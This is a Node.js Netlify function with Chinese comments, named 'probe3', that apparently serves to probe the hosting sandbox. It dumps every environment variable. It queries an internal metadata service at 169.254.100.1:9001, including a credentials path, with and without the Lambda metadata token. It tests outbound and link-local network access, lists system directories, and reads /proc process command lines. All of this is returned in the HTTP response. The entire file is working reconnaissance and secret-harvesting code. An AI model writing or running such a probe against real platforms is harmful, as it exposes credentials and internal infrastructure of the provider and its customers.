// Netlify probe3: 完整 env + metadata API(169.254.100.1:9001)+ 出网白名单 + fs 深探
const fs = require('fs');
const os = require('os');

const fetchT = async (url, opts = {}, ms = 4000) => {
  const ac = new AbortController();
  const t = setTimeout(() => ac.abort(), ms);
  try {
    const r = await fetch(url, { ...opts, signal: ac.signal, redirect: 'manual' });
    const b = await r.text();
    return r.status + ' ' + b.slice(0, 500).replace(/\n/g, '\\n');
  } catch (e) {
    return 'ERR ' + String(e).slice(0, 120);
  } finally { clearTimeout(t); }
};

exports.handler = async () => {
  const out = { env: {}, meta: [], net: [], fs: {} };
  // 1. 完整 env(截断到 400 但完整键名)
  for (const k of Object.keys(process.env)) {
    const v = process.env[k] || '';
    out.env[k] = v.length > 400 ? v.slice(0, 400) + '..len' + v.length : v;
  }
  // 2. metadata API 探测: 169.254.100.1:9001 各路径
  const paths = [
    '/', '/2022-08-11/metadata', '/2022-08-11/metadata/region', '/2022-08-11/metadata/account-id',
    '/2022-08-11/metadata/function-name', '/2022-08-11/metadata/function-version',
    '/2022-08-11/metadata/credentials', '/2022-08-11/metadata/container-id',
    '/2022-08-11/metadata/function-arn', '/2022-08-11/metadata/all', '/2018-06-01/runtime/invocation/next',
    '/latest/meta-data', '/latest/dynamic/instance-identity/document', '/ping', '/metrics',
  ];
  for (const p of paths) {
    for (const hdr of [null, { 'AWS_LAMBDA_METADATA_TOKEN': process.env.AWS_LAMBDA_METADATA_TOKEN || '' }]) {
      const r = await fetchT('http://169.254.100.1:9001' + p, hdr ? { headers: hdr } : {});
      out.meta.push((hdr ? '[tok]' : '[no]') + ' ' + p + ' => ' + r);
    }
  }
  // 3. 出网白名单
  const targets = [
    'https://api.netlify.com/api/v1/user', 'https://www.netlify.com', 'https://example.com',
    'https://netlify.com', 'https://*.netlify.app', 'http://functions.netlify.com',
    'https://github.com', 'http://169.254.100.1:2000/', 'http://169.254.100.5/', 'http://169.254.100.6/',
    'http://169.254.100.1/', 'http://169.254.100.1:9001/2018-06-01/runtime/invocation/next',
  ];
  for (const t of targets) {
    if (t.includes('*')) continue;
    out.net.push(t + ' => ' + await fetchT(t, {}, 5000));
  }
  // 4. fs 深探
  const rd = (p, ms = 2000) => {
    try { const ac = new AbortController(); const t = setTimeout(() => ac.abort(), ms); const r = fs.readdirSync(p, { withFileTypes: true }); clearTimeout(t); return r.map(e => e.name + (e.isDirectory() ? '/' : '')).join(','); }
    catch (e) { return 'ERR ' + String(e).slice(0, 80); }
  };
  out.fs.varRuntime = rd('/var/runtime');
  out.fs.opt = rd('/opt');
  out.fs.optExt = rd('/opt/extensions');
  out.fs.dev = rd('/dev');
  out.fs.proc = rd('/proc');
  out.fs.tmp = rd('/tmp');
  out.fs.home = rd('/home/sbx_user1051');
  out.fs.etc = rd('/etc');
  out.fs.root = rd('/');
  out.fs.runtime = rd('/var/runtime/node_modules');
  // nf_req_v1
  try { out.fs.tmpReq = fs.readFileSync('/tmp/nf_req_v1', 'utf8').slice(0, 800); } catch (e) { out.fs.tmpReq = 'ERR ' + e; }
  // 5. /proc 进程遍历(前 20)
  const procs = [];
  try {
    const pids = fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x)).slice(0, 25);
    for (const pid of pids) {
      let cmd = '';
      try { cmd = fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').split('\0').join(' ').slice(0, 150); } catch (e) {}
      procs.push(pid + ': ' + cmd);
    }
  } catch (e) { out.fs.procs = 'ERR ' + e; }
  out.fs.procs = procs;
  return { statusCode: 200, body: JSON.stringify(out) };
};
